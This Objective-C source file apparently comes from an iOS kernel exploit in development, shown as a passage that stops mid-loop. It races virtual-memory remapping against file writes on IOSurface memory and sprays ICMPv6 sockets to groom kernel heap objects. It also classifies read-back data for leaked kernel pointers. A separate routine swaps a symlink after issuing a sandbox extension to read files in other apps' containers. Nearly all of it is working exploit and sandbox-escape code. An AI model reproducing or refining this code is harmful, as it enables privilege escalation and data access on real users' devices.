// LightSwordCalib.m
// v10: Hot-Replay Tuner (ID-sweep choreography, unsplit, spray-ON) + cross-boot hot-offset persistence
// (v8 was the sock_DGRAM spray ID sweep; v9 split-sampler demoted to negative control)

#import "LightSwordCalib.h"
#import "LabKnob.h"
#import "LabBandit.h"

#include <dlfcn.h>
#include <errno.h>
#include <sys/resource.h>
#include <fcntl.h>
#include <mach/mach.h>
#include <mach/mach_time.h>
#include <pthread.h>
#include <pthread/qos.h>
#include <stdarg.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/icmp6.h>
#include <sys/uio.h>
#include <unistd.h>
#include <stdio.h>
#include <sys/sysctl.h>

typedef struct __IOSurface *IOSurfaceRef;
kern_return_t mach_vm_map(vm_map_t target_task, mach_vm_address_t *address, mach_vm_size_t size, mach_vm_offset_t mask, int flags, mem_entry_name_port_t object, memory_object_offset_t offset,
                          boolean_t copy, vm_prot_t cur_protection, vm_prot_t max_protection, vm_inherit_t inheritance);
kern_return_t mach_vm_allocate(vm_map_t target, mach_vm_address_t *address, mach_vm_size_t size, int flags);
kern_return_t mach_vm_deallocate(vm_map_t target, mach_vm_address_t address, mach_vm_size_t size);

typedef IOSurfaceRef (*IOSurfaceCreate_t)(CFDictionaryRef);
typedef void *(*IOSurfaceGetBaseAddress_t)(IOSurfaceRef);
typedef void (*IOSurfacePrefetchPages_t)(IOSurfaceRef);

#define PAGE_TAG_BASE 0xC0DEC0DE00000000ULL
#define PAGE_ID(i) (PAGE_TAG_BASE | (uint64_t)(i))
#define M0_TAG      0xA11AA11AA11AA11AULL

#define RC_ITERS_H  3000
#define RC_TRIES    30
#define RC_STRIDE   8
#define RC_NQ       (0xf00 / 8)

/* Socket Spray Constants (matching ClearSword socket.c) */
#define SOCK_SPRAY_BURST 512
#define SOCK_SPRAY_DELAY 50

static volatile int rc_started = 0;
static volatile int rc_go = 0;
static volatile int rc_raceOn = 0;
static volatile mach_vm_address_t rc_mapAddr = 0;
static volatile mach_vm_size_t rc_mapSize = 0;
static volatile mach_port_t rc_mapObj = MACH_PORT_NULL;
static volatile mach_vm_offset_t rc_mapOff = 0;
static volatile uint64_t rc_mapErr = 0;

static volatile int rc_sprayGo = 0;
static volatile uint64_t rc_sprayAllocs = 0;
static volatile uint64_t rc_sprayFrees = 0;

static void *rc_swap_thread(void *arg) {
    (void)arg;
    pthread_set_qos_class_self_np(QOS_CLASS_USER_INTERACTIVE, 0);
    while (!rc_started);
    while (rc_go) {
        while (!rc_raceOn && rc_go);
        if (!rc_go) break;
        mach_vm_address_t a = rc_mapAddr;
        kern_return_t kr = mach_vm_map(mach_task_self(), &a, rc_mapSize, 0,
                                       VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
                                       rc_mapObj, rc_mapOff, false,
                                       VM_PROT_DEFAULT, VM_PROT_DEFAULT,
                                       VM_INHERIT_NONE);
        if (kr != KERN_SUCCESS) rc_mapErr++;
        rc_raceOn = 0;
    }
    return NULL;
}

#define RC_HOLD_MAX 4096
static int rc_hold[RC_HOLD_MAX];
static int rc_holdN = 0;
static uint32_t g_rcHoldCap = RC_HOLD_MAX; /* 12 EMFILE receipts: cap the groom holds under the process fd limit so the spray never starts blind (24 = table already full) */
static int g_rc_log_fd;   /* forward decl: the spray thread's wall diagnostic
                             runs before the definition below */

/* The ClearSword Socket Spray Thread (SOCK_DGRAM) */
static void *rc_socket_spray_thread(void *arg) {
    (void)arg;
    pthread_set_qos_class_self_np(QOS_CLASS_USER_INITIATED, 0);

    uint32_t blindBursts = 0;
    while (rc_sprayGo) {
        int fds[SOCK_SPRAY_BURST];
        int count = 0;
        static int g_interleaveTotal = 0;
        int held = 0;

        // Spray sockets (allocates inpcb in kernel)
        for (int i = 0; i < SOCK_SPRAY_BURST; i++) {
            fds[i] = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6);
            if (fds[i] >= 0) {
                count++;
            } else if (count == 0 && i == 0) {
                /* name the wall once (the 12-debugger sockets=0 boot) */
                if (g_rc_log_fd >= 0)
                    dprintf(g_rc_log_fd,
                            "[spray] first socket() failed errno=%d — thread is blind\n",
                            errno);
            }
        }

        // THE INTERLEAVED GROOM (2026-11-07, the AIM/oob decode): hold
        // every EVEN fd (persistent occupancy — our pages stay put),
        // close every ODD fd (freed slots refilled by SYSTEM churn =
        // OTHER processes' pointer-bearing structures). The confused
        // read then has foreign pages in play — the AIM classifier's
        // KPTR row is the unlock test.
        for (int i = 0; i < SOCK_SPRAY_BURST; i++) {
            if (fds[i] < 0) continue;
            if (i & 1) {
                close(fds[i]);                    /* odd = freed for churn */
                rc_sprayFrees++;
            } else {
                g_interleaveTotal++;              /* even = HELD */
                held++;
            }
        }
        if (g_interleaveTotal > 4096) {           /* the release law: un-hold */
            for (int i = 0; i < rc_holdN; i++) close(rc_hold[i]);
            rc_holdN = 0; g_interleaveTotal = 0;
        }
        if (rc_holdN + held < (int)(sizeof(rc_hold)/sizeof(rc_hold[0])) &&
            rc_holdN + held < (int)g_rcHoldCap) {
            int nh = 0;
            for (int i = 0; i < SOCK_SPRAY_BURST; i++)
                if (fds[i] >= 0 && !(i & 1)) rc_hold[rc_holdN++] = fds[i], nh++;
            (void)nh;
        } else {
            for (int i = 0; i < SOCK_SPRAY_BURST; i++) if (fds[i] >= 0 && !(i & 1)) close(fds[i]);
        }
        rc_sprayAllocs += count;
        /* v12.1 fd-law: a table already full (errno 24 = EMFILE) makes every
           burst blind — give the calib its thread back after 32 and name it */
        if (count == 0) {
            if (++blindBursts >= 32) {
                if (g_rc_log_fd >= 0)
                    dprintf(g_rc_log_fd,
                            "[spray] 32 blind bursts (last errno=%d) — thread exits; "
                            "fd table is full before the spray (groom cap next boot)\n",
                            errno);
                return NULL;
            }
        } else blindBursts = 0;
        usleep(SOCK_SPRAY_DELAY);
    }
    return NULL;
}

@implementation LightSwordCalib

static int g_rc_log_fd = -1;
static int g_hotPersistFd = -1;   /* reserved BEFORE the groom/spray eats the
                                     fd table (the 17-debugger errno=24 receipt
                                     law: a late open EMFILEs and the boot's
                                     hot offsets are lost) */
static int g_rcUntagged = 0;      /* v3 spray-tag knob (bandit arm "untagged") */
static BOOL g_rcBanditInit = NO;  /* one-shot cscali domain registration */
static NSMutableString *g_rc_log_str = nil;

static void rc_log(const char *fmt, ...) {
    char buf[4096];
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    fprintf(stderr, "%s\n", buf);
    fflush(stderr);
    if (g_rc_log_fd >= 0) {
        write(g_rc_log_fd, buf, strlen(buf));
        write(g_rc_log_fd, "\n", 1);
        fcntl(g_rc_log_fd, F_FULLFSYNC);
    }
    if (g_rc_log_str) [g_rc_log_str appendFormat:@"%s\n", buf];
    usleep(1000);
}


/* ---- v11 CROSS-APP HOT SYNC (the 24A435 hot-file law) ----------------
   The hot file is per-container. The OTHER Lum1na build accumulates the
   warm set (24A435: the main app's container held 454 offsets while the
   debugger started cold on every reinstall). Merge law: enumerate app
   containers (MCM class 15, metadata-only flags), read each candidate's
   Documents/lightsword_hot.txt (fallback racecalib_hot.txt) through the
   P116 issue/swap/consume read, parse offsets, dedup into the warm set.
   Read-only outside our own container; tokens never logged. */
static long rc_read_remote(const char *abs, char *out, long cap) {
    NSString *docs = [NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    NSString *work = [docs stringByAppendingPathComponent:@"rcsync"];
    [[NSFileManager defaultManager] createDirectoryAtPath:work
        withIntermediateDirectories:YES attributes:nil error:nil];
    NSString *s = [work stringByAppendingPathComponent:@"s"];
    NSString *l = [work stringByAppendingPathComponent:@"l"];
    [@("rcsync-marker\n") writeToFile:s atomically:YES encoding:NSUTF8StringEncoding error:nil];
    unlink(l.UTF8String);
    if (symlink(s.UTF8String, l.UTF8String) != 0) return -1;
    char *(*issueFn)(const char *, const char *, uint64_t) =
        (char *(*)(const char *, const char *, uint64_t))dlsym(RTLD_DEFAULT, "sandbox_extension_issue_file");
    if (!issueFn) return -1;
    char *tok = issueFn("com.apple.app-sandbox.read", l.UTF8String, 0);
    if (!tok) return -1;
    unlink(l.UTF8String);
    if (symlink(abs, l.UTF8String) != 0) { memset(tok, 0, strlen(tok)); free(tok); return -1; }
    int64_t h = ((int64_t (*)(const char *))dlsym(RTLD_DEFAULT, "sandbox_extension_consume"))(tok);
    memset(tok, 0, strlen(tok)); free(tok);
    if (h <= 0) return -1;
    long total = 0;
    int fd = open(l.UTF8String, O_RDONLY);
    if (fd >= 0) {
        while (total < cap) {
            ssize_t r = read(fd, out + total, (size_t)(cap - total));
            if (r <= 0) break;
            total += r;
        }
        close(fd);
    }
    void (*rel)(int64_t) = (void (*)(int64_t))dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    if (rel) rel(h);
    unlink(l.UTF8String);
    return total > 0 ? total : -1;
}

static uint32_t rc_hotsync_warm(uint64_t *warm, uint32_t warmNin) {
    __block uint32_t warmN = warmNin;
    typedef void *(*cq_create_t)(void);
    typedef void (*cq_set_class_t)(void *, uint64_t);
    typedef void (*cq_set_flags_t)(void *, uint64_t);
    typedef void (*cq_iterate_t)(void *, void (^)(void *));
    typedef void (*cq_free_t)(void *);
    void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!mgr) { rc_log("[hotsync] containermanager dlopen miss"); return warmN; }
    cq_create_t qCreate = (cq_create_t)dlsym(mgr, "container_query_create");
    cq_set_class_t qClass = (cq_set_class_t)dlsym(mgr, "container_query_set_class");
    cq_set_flags_t qFlags = (cq_set_flags_t)dlsym(mgr, "container_query_operation_set_flags");
    cq_iterate_t qIterate = (cq_iterate_t)dlsym(mgr, "container_query_iterate_results_sync");
    cq_free_t qFree = (cq_free_t)dlsym(mgr, "container_query_free");
    char *(*oIdent)(void *) = (char *(*)(void *))dlsym(mgr, "container_object_get_identifier");
    void (*oPath)(void *, char *, uint64_t) = (void (*)(void *, char *, uint64_t))dlsym(mgr, "container_object_get_path");
    if (!qCreate || !qClass || !qFlags || !qIterate || !qFree || !oPath) {
        rc_log("[hotsync] mcm syms miss"); return warmN;
    }
    void *q = qCreate();
    if (!q) return warmN;
    qClass(q, 15);                    /* app-managed containers, metadata-only */
    qFlags(q, 0x100000000ULL);
    __block uint32_t merged = 0;
    __block int cands = 0;
    void (^fill)(void *) = ^void(void *obj) {
        char path[1024]; path[0] = 0;
        oPath(obj, path, sizeof path);
        if (!path[0]) return;
        cands++;
        static const char *names[2] = { "lightsword_hot.txt", "racecalib_hot.txt" };
        static char buf[8192];
        for (int ni = 0; ni < 2; ni++) {
            char target[1200];
            snprintf(target, sizeof target, "%s/Documents/%s", path, names[ni]);
            long n = rc_read_remote(target, buf, (long)sizeof buf - 1);
            if (n <= 0) continue;
            buf[n] = 0;
            char *save = NULL;
            for (char *ln = strtok_r(buf, "\n", &save); ln; ln = strtok_r(NULL, "\n", &save)) {
                uint64_t v = 0;
                if (sscanf(ln, "%llx", &v) == 1 && v) {
                    int dup = 0;
                    for (uint32_t k = 0; k < warmN; k++) if (warm[k] == v) { dup = 1; break; }
                    if (!dup && warmN < 512) { warm[warmN++] = v; merged++; }
                }
            }
            if (merged && oIdent) {
                char *ident = oIdent(obj);
                NSString *nm = ident ? [NSString stringWithUTF8String:ident] : @"";
                rc_log("[hotsync] merged=%u from %@", merged, nm);
            }
            break;                      /* one name per container is enough */
        }
        return;
    };

    qIterate(q, fill);
    rc_log("[hotsync] pass1 class=15 flags=0x100000000 containers=%d merged=%u",
           cands, merged);
    if (cands == 0) {
        /* pass2: same class, no operation flags — the 17-debugger receipt
           showed pass1 empty; a bare metadata query either enumerates or
           proves the XPC wall, and the log line names which */
        qFree(q);
        void *q2 = qCreate();
        if (q2) {
            qClass(q2, 15);
            qFlags(q2, 0);
            qIterate(q2, fill);
            rc_log("[hotsync] pass2 flags=0 containers=%d merged=%u", cands, merged);
            qFree(q2);
        }
        if (cands == 0)
            rc_log("[hotsync] MCM enumerated ZERO containers — XPC denied or no visible app-managed set");
    } else {
        qFree(q);
    }
    rc_log("[hotsync] containers=%d merged=%u total-warm=%u", cands, merged, warmN);
    return warmN;
}

typedef enum { C_M0, C_CORRECT, C_WRONG, C_FOREIGN, C_ZERO, C_PARTIAL } rc_cls_t;
static uint64_t g_calibAim = 0;

static void rc_aim(const uint64_t *rbBuf, uint32_t cls, int fdMark,
                   uint64_t off, unsigned long vm_page_size, uint64_t hmarker) {
    if (g_calibAim++ >= 12) return;
    uint64_t kptrs[8] = {0}; int kn = 0, cont = 0, zro = 0;
    for (size_t qi = 0; qi < RC_NQ; qi++) {
        uint64_t q = rbBuf[qi];
        if (q == hmarker) continue;
        if (q == 0) { zro++; continue; }
        if ((q >> 36) == 0xfffffff0ull || (q >> 32) == 0xfffffe00ull ||
            q >= 0xfffffe0000000000ull) {
            if (kn < 8) kptrs[kn++] = q;
        }
        cont++;
    }
    rc_log("  AIM %s: content-qwords=%llu zero=%llu KPTR=%llu%s",
           cls == C_PARTIAL ? "PARTIAL" : (cls == C_WRONG ? "WRONG" : "FOREIGN"),
           (unsigned long long)cont, (unsigned long long)zro,
           (unsigned long long)kn, kn ? "  <-- POINTERS" : "");
    for (int ki = 0; ki < kn; ki++)
        rc_log("  AIM kptr[%d]=0x%016llx", ki, (unsigned long long)kptrs[ki]);
    if (kn == 0) {
        for (int st = 1; st <= 4; st++) {
            uint8_t wb[RC_NQ * 8];
            ssize_t wn = pread(fdMark, wb, sizeof(wb), (off_t)off + 0x4000 + (off_t)st * (off_t)vm_page_size);
            if (wn < 8) break;
            uint64_t *wq8 = (uint64_t *)wb;
            int wkn = 0, wcont = 0; uint64_t wfirst = 0;
            for (size_t qi = 0; qi < RC_NQ; qi++) {
                uint64_t q = wq8[qi];
                if (q == 0) continue;
                wcont++;
                if (wfirst == 0) wfirst = q;
                if ((q >> 36) == 0xfffffff0ull || (q >> 32) == 0xfffffe00ull ||
                    q >= 0xfffffe0000000000ull) wkn++;
            }
            if (wcont)
                rc_log("  AIM-walk +%#02x content=%llu kptr=%llu first=0x%016llx",
                       (st * 0x4000), (unsigned long long)wcont,
                       (unsigned long long)wkn, (unsigned long long)wfirst);
            if (wkn > 0) break;
        }
    }
}


static rc_cls_t rc_cls(const uint64_t *buf, uint32_t expected, uint32_t npages,
                       uint64_t *got, int32_t *delta) {
    uint64_t first = buf[0];
    int all = 1;
    for (int i = 1; i < RC_NQ; i++) if (buf[i] != first) { all = 0; break; }
    *got = first;
    *delta = 0;
    if (!all) return C_PARTIAL;
    if (first == 0) return C_ZERO;
    if (first == M0_TAG) return C_M0;
    if ((first & 0xFFFFFFFF00000000ULL) == PAGE_TAG_BASE) {
        uint32_t idx = (uint32_t)first;
        if (idx == expected) return C_CORRECT;
        if (idx < npages) { *delta = (int32_t)idx - (int32_t)expected; return C_WRONG; }
    }
    /* Check for kernel pointers (inpcb structure fields) */
    /* inpcb starts with LIST_ENTRY (pointers). If we see 0xfffffff0..., it's a kernel object! */
    if ((first >> 36) == 0xfffffff0ULL) return C_FOREIGN;
    /* Also check offset 0x40 (inpcb.inp_socket) which is a common pointer */
    if ((buf[8] >> 36) == 0xfffffff0ULL) return C_FOREIGN;
    
    return C_FOREIGN;
}

static CFNumberRef RCNUM(int64_t v) {
    return CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt64Type, &v);
}

+ (NSString *)runCalib {
    g_rc_log_str = [NSMutableString string];
    NSString *docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    NSString *lp = [docs stringByAppendingPathComponent:@"racecalib_log.txt"];
    g_rc_log_fd = open([lp UTF8String], O_CREAT | O_TRUNC | O_WRONLY, 0644);
    rc_log("time %s", [[[NSDate date] description] UTF8String]);
    rc_log("=== LightSword calib v11-wrongsample — SOCK_DGRAM socket spray ===");
    {
        char mch[64] = "?", osv[32] = "?";
        size_t mlen = sizeof mch, olen = sizeof osv;
        sysctlbyname("hw.machine", mch, &mlen, NULL, 0);
        sysctlbyname("kern.osversion", osv, &olen, NULL, 0);
        rc_log("IDENT device=%s os=%s", mch, osv);
    }
    /* LightSword: hot-offset set from previous boots (per-boot law — PARTIAL
       windows rotate/recur across boots; the tuner accumulates the set).
       Reads lightsword_hot.txt, falling back to the legacy racecalib_hot.txt
       so pre-rename accumulated warm sets survive. Writes under the new name. */
    uint64_t rc_warm[512]; uint32_t warmN = 0;
    char hotfile[512];
    char wrongfile[512];
    {
        NSString *docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
        NSString *hp2 = [docs stringByAppendingPathComponent:@"lightsword_hot.txt"];
        NSString *wp2 = [docs stringByAppendingPathComponent:@"lightsword_wrong.txt"];
        snprintf(hotfile, sizeof hotfile, "%s", [hp2 fileSystemRepresentation]);
        snprintf(wrongfile, sizeof wrongfile, "%s", [wp2 fileSystemRepresentation]);
        /* the reserve: open the persist fd NOW, before the groom/spray
           fills the table (17-debugger receipt: persist after runs
           EMFILEd, errno=24, and the boot's PARTIALs were lost) */
        g_hotPersistFd = open(hotfile, O_WRONLY | O_CREAT | O_APPEND, 0644);
        rc_log("[hotsync] persist fd reserved fd=%d (%s)",
               g_hotPersistFd, g_hotPersistFd >= 0 ? hotfile : "FAILED");
        NSString *hpl = [docs stringByAppendingPathComponent:@"racecalib_hot.txt"];
        NSString *readFrom = [NSFileManager.defaultManager fileExistsAtPath:hp2] ? hp2 : hpl;
        NSString *srcName = [NSFileManager.defaultManager fileExistsAtPath:hp2] ? @"lightsword_hot.txt"
                          : ([NSFileManager.defaultManager fileExistsAtPath:hpl] ? @"racecalib_hot.txt" : @"(none)");
        FILE *hf0 = fopen([readFrom fileSystemRepresentation], "r");
        if (hf0) {
            char ln0[64];
            while (fgets(ln0, sizeof ln0, hf0)) {
                uint64_t v = 0;
                if (sscanf(ln0, "%llx", &v) == 1 && v && warmN < 512) rc_warm[warmN++] = v;
            }
            fclose(hf0);
        }
        rc_log("--- LightSword warm hot set: %u offsets from %@", warmN, srcName);
    }
    /* v11: merge the OTHER build's hot set (cross-app, read-only) */
    warmN = rc_hotsync_warm(rc_warm, warmN);
    rc_log("logfile: %s", [lp UTF8String]);
    rc_log("vm_page_size=0x%lx", vm_page_size);

    void *iosf = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    IOSurfaceCreate_t pCreate = (IOSurfaceCreate_t)dlsym(iosf, "IOSurfaceCreate");
    IOSurfaceGetBaseAddress_t pBase = (IOSurfaceGetBaseAddress_t)dlsym(iosf, "IOSurfaceGetBaseAddress");
    IOSurfacePrefetchPages_t pPrefetch = (IOSurfacePrefetchPages_t)dlsym(iosf, "IOSurfacePrefetchPages");
    if (!pCreate || !pBase) { rc_log("STOP no IOSurface"); goto done; }
    rc_log("IOSurfacePrefetchPages %s", pPrefetch ? "resolved" : "MISSING");

    uint64_t hmarker = ((uint64_t)arc4random() << 32) | arc4random();

    IOSurfaceRef surfBig = pCreate((__bridge CFDictionaryRef)@{ @"IOSurfaceAllocSize": @(0x8000), @"IOSurfaceMemoryRegion": @"PurpleGfxMem" });
    IOSurfaceRef surfSmall = pCreate((__bridge CFDictionaryRef)@{ @"IOSurfaceAllocSize": @(0x2000), @"IOSurfaceMemoryRegion": @"PurpleGfxMem" });
    if (!surfBig || !surfSmall) { rc_log("STOP surface create"); goto done; }

    /* Wire the IOSurface pages */
    if (pPrefetch) {
        pPrefetch(surfBig);
        pPrefetch(surfSmall);
        rc_log("prefetch OK on surfBig and surfSmall (wired)");
    }

    mach_port_t pcObjBig = 0, pcObjSmall = 0;
    mach_vm_address_t pcBig = 0, pcSmall = 0;
    mach_vm_size_t sz;
    kern_return_t kr;
    sz = 0x8000;
    kr = mach_make_memory_entry_64(mach_task_self(), &sz, (mach_vm_address_t)pBase(surfBig), VM_PROT_DEFAULT, &pcObjBig, 0);
    if (kr == KERN_SUCCESS)
        kr = mach_vm_map(mach_task_self(), &pcBig, 0x8000, 0, VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR, pcObjBig, 0, false, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
    if (kr != KERN_SUCCESS) { rc_log("STOP pcBig 0x%x", kr); goto done; }
    sz = 0x2000;
    kr = mach_make_memory_entry_64(mach_task_self(), &sz, (mach_vm_address_t)pBase(surfSmall), VM_PROT_DEFAULT, &pcObjSmall, 0);
    if (kr == KERN_SUCCESS)
        kr = mach_vm_map(mach_task_self(), &pcSmall, 0x2000, 0, VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR, pcObjSmall, 0, false, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
    if (kr != KERN_SUCCESS) { rc_log("STOP pcSmall 0x%x", kr); goto done; }

    /* v3 spray-tag knob: the guide's #1 experiment ("spray_tagged=false").
       knob "cscali" = "untagged" -> the fill becomes the per-boot random
       hmarker (never the a11a constant), so OWN pages can't be confused
       with the spray tag; anything foreign lands as an honest FOREIGN. */
    {
        char knobv[32];
        g_rcUntagged = (LabKnobRead("cscali", knobv, (int)sizeof knobv) == 1)
                       && (strncmp(knobv, "untagged", 8) == 0);
    }
    uint64_t m0 = g_rcUntagged ? hmarker : M0_TAG;
    memset_pattern8((void *)pcBig, &m0, 0x8000);
    rc_log("pcBig=0x%llx M0_TAG=0x%llx spray=%s fill=0x%llx (page2 qword=0x%llx)",
           pcBig, M0_TAG, g_rcUntagged ? "UNTAGGED(hmarker)" : "tagged(a11a)",
           m0, *(uint64_t *)(pcBig + 0x4000));

    mach_vm_address_t searchMap = 0;
    mach_vm_size_t searchSize = 0x2000 * vm_page_size;
    uint32_t npages = (uint32_t)(searchSize / vm_page_size);
    kr = mach_vm_allocate(mach_task_self(), &searchMap, searchSize, VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR);
    if (kr != KERN_SUCCESS) { rc_log("STOP search alloc 0x%x", kr); goto done; }
    for (uint32_t i = 1; i < npages; i += 2) {
        uint64_t id = PAGE_ID(i);
        memset_pattern8((void *)(searchMap + (uint64_t)i * vm_page_size), &id, vm_page_size);
    }
    for (uint32_t i = 0; i < npages; i += 2) {
        uint64_t id = PAGE_ID(i);
        memset_pattern8((void *)(searchMap + (uint64_t)i * vm_page_size), &id, vm_page_size);
    }

    IOSurfaceRef lockSurf = NULL;
    if (pPrefetch) {
        CFMutableDictionaryRef props = CFDictionaryCreateMutable(kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
        CFNumberRef aN = RCNUM((int64_t)searchMap);
        CFNumberRef sN = RCNUM((int64_t)searchSize);
        CFDictionarySetValue(props, CFSTR("IOSurfaceAddress"), aN);
        CFDictionarySetValue(props, CFSTR("IOSurfaceAllocSize"), sN);
        lockSurf = pCreate(props);
        CFRelease(aN); CFRelease(sN); CFRelease(props);
        if (lockSurf) {
            pPrefetch(lockSurf);
            rc_log("mlock/prefetch OK lockSurf=%p size=0x%llx", lockSurf, (uint64_t)searchSize);
        } else {
            rc_log("WARN IOSurfaceCreate(wrap searchMap) failed — running without mlock");
        }
    }

    mach_port_t searchObj = 0;
    sz = searchSize;
    kr = mach_make_memory_entry_64(mach_task_self(), &sz, searchMap, VM_PROT_DEFAULT, &searchObj, 0);
    if (kr != KERN_SUCCESS) { rc_log("STOP search entry 0x%x", kr); goto done; }

    mach_vm_address_t anonMap = 0;
    kr = mach_vm_allocate(mach_task_self(), &anonMap, 0x2000, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) { rc_log("STOP anon 0x%x", kr); goto done; }
    memset((void *)anonMap, 0x41, 0x2000);
    mach_port_t anonObj = 0;
    sz = 0x2000;
    kr = mach_make_memory_entry_64(mach_task_self(), &sz, anonMap, VM_PROT_DEFAULT, &anonObj, 0);
    if (kr != KERN_SUCCESS) { rc_log("STOP anon entry 0x%x", kr); goto done; }

    char tmp[1024];
    confstr(_CS_DARWIN_USER_TEMP_DIR, tmp, sizeof(tmp));
    char pz[1100], pm[1100];
    snprintf(pz, sizeof(pz), "%s%u", tmp, arc4random());
    snprintf(pm, sizeof(pm), "%s%u", tmp, arc4random());
    uint8_t *zbuf = calloc(2, 0x8000);
    FILE *fp = fopen(pz, "w"); fwrite(zbuf, 1, 0x8000, fp); fclose(fp);
    fp = fopen(pm, "w"); fwrite(zbuf, 1, 0x8000, fp); fclose(fp);
    int fdZero = open(pz, O_RDWR);
    int fdMark = open(pm, O_RDWR);
    /* v3 fd-wall fix (the 12 receipts: H wFail=3000, debugger sockets=0):
       _CS_DARWIN_USER_TEMP_DIR can be denied in a fresh container and the
       code never checked. Fall back to Documents and name the failure. */
    if (fdZero < 0 || fdMark < 0) {
        rc_log("[scratch] DARWIN_TEMP open failed errno=%d (zero=%d mark=%d) — Documents fallback",
               errno, fdZero, fdMark);
        NSString *d2 = [NSSearchPathForDirectoriesInDomains(
            NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
        snprintf(pz, sizeof pz, "%s/z%u", [d2 fileSystemRepresentation], arc4random());
        snprintf(pm, sizeof pm, "%s/m%u", [d2 fileSystemRepresentation], arc4random());
        fp = fopen(pz, "w"); if (fp) { fwrite(zbuf, 1, 0x8000, fp); fclose(fp); }
        fp = fopen(pm, "w"); if (fp) { fwrite(zbuf, 1, 0x8000, fp); fclose(fp); }
        if (fdZero < 0) fdZero = open(pz, O_RDWR);
        if (fdMark < 0) fdMark = open(pm, O_RDWR);
        remove(pz); remove(pm);
        rc_log("[scratch] retry zero=%d mark=%d", fdZero, fdMark);
    }
    fcntl(fdZero, F_NOCACHE, 1);
    fcntl(fdMark, F_NOCACHE, 1);
    remove(pz); remove(pm);

    /* v12.1 fd-law: size the groom's holds to leave spray headroom */
    {
        struct rlimit rl;
        if (getrlimit(RLIMIT_NOFILE, &rl) == 0 && rl.rlim_cur > 2048)
            g_rcHoldCap = (uint32_t)(rl.rlim_cur - 2048 < RC_HOLD_MAX ?
                            (rl.rlim_cur - 2048) : RC_HOLD_MAX);
        else if (rl.rlim_cur > 0) g_rcHoldCap = rl.rlim_cur / 2;
        if (g_rc_log_fd >= 0)
            dprintf(g_rc_log_fd, "[groom] hold cap=%u (soft rlimit=%llu)\n",
                    g_rcHoldCap, (unsigned long long)rl.rlim_cur);
    }
    rc_started = 0; rc_go = 1; rc_raceOn = 0; rc_mapErr = 0;
    rc_sprayGo = 1;
    rc_sprayAllocs = 0;
    rc_sprayFrees = 0;
    pthread_t th, thSpray;
    pthread_create(&th, NULL, rc_swap_thread, NULL);
    pthread_create(&thSpray, NULL, rc_socket_spray_thread, NULL); /* SOCKET SPRAY */
    rc_started = 1;
    rc_log("socket spray thread started (burst=%d, SOCK_DGRAM)", SOCK_SPRAY_BURST);

    {
        rc_log("--- H control ---");
        rc_mapAddr = pcSmall; rc_mapSize = 0x2000; rc_mapObj = anonObj; rc_mapOff = 0;
        struct iovec iov = { (void *)(pcSmall + 0x3f00), 0x4000 };
        uint64_t wFail = 0, hits = 0;
        for (int it = 0; it < RC_ITERS_H; it++) {
            mach_vm_address_t a = pcSmall;
            mach_vm_map(mach_task_self(), &a, 0x2000, 0, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, pcObjSmall, 0, false, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
            *(uint64_t *)(pcSmall + 0x3f00) = hmarker;
            rc_raceOn = 1;
            ssize_t w = pwritev(fdZero, &iov, 1, 0x3f00);
            while (rc_raceOn == 1);
            if (w == -1) {
                wFail++;
                uint64_t rb = 0;
                pread(fdZero, &rb, 8, 0x3f00);
                if (rb != hmarker) hits++;
            }
        }
        rc_log("H: iters=%d wFail=%llu hits=%llu", RC_ITERS_H, wFail, hits);
    }

    rc_log("--- ID sweep delay=0 mlock=%s stride=%d tries=%d (ALL pwritev classified) ---",
           lockSurf ? "yes" : "no", RC_STRIDE, RC_TRIES);
    rc_log("--- spray active: sockets=%llu ---", rc_sprayAllocs);

    uint64_t rbBuf[RC_NQ];
    static const uint8_t zreset[0x1000] = {0};
    uint64_t nOff = 0, nOk = 0, nFail = 0;
    uint64_t okM0=0, okC=0, okW=0, okF=0, okZ=0, okP=0;
    uint64_t flM0=0, flC=0, flW=0, flF=0, flZ=0, flP=0;
    int dumped = 0;
    int failErrno[16] = {0};
    uint64_t rc_hotOffs[32]; uint32_t rc_hotN = 0;

    for (uint32_t start = 0; start + 1 < npages; start += RC_STRIDE) {
        mach_vm_offset_t off = (mach_vm_offset_t)start * vm_page_size;
        uint32_t expected = start + 1;
        rc_mapAddr = pcBig; rc_mapSize = 0x8000; rc_mapObj = searchObj; rc_mapOff = off;
        struct iovec iov = { (void *)(pcBig + 0x3f00), 0x4000 };
        nOff++;

        for (int it = 0; it < RC_TRIES; it++) {
            mach_vm_address_t a = pcBig;
            mach_vm_map(mach_task_self(), &a, 0x8000, 0, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, pcObjBig, 0, false, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
            memset_pattern8((void *)pcBig, &m0, 0x8000);
            pwrite(fdMark, zreset, sizeof(zreset), 0x3f00);

            rc_raceOn = 1;
            ssize_t w = pwritev(fdMark, &iov, 1, 0x3f00);
            int e = errno;
            while (rc_raceOn == 1);

            int isFail = (w == -1);
            if (isFail) {
                nFail++;
                if (e >= 0 && e < 16) failErrno[e]++;
            } else {
                nOk++;
            }

            pread(fdMark, rbBuf, sizeof(rbBuf), 0x4000);
